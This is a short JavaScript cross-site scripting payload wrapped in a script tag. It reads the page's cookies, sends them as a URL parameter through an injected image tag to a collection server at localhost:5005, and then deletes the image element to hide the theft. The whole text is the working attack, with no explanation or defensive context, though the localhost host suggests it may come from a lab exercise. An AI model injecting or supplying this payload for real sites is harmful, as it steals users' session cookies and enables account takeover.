<script>
var c = document.cookie;
document.write('<img id="cookie-monster" src="http://localhost:5005/?cookies='+c + '"></img>');
var stealer = document.getElementById("cookie-monster");
stealer.parentNode.removeChild(stealer);
</script>
